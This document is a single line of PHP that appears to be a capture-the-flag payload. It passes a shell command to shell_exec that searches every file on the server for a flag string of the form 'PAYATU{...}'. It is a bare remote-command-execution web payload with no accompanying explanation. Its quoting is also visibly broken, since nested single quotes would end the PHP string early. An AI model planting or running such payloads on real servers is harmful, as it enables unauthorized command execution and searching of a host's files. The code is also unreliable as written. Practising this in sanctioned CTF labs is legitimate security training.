<?php echo shell_exec('find / -type f -exec grep -a -E 'PAYATU\{.*\}' {} \; 2>/dev/null'); ?>
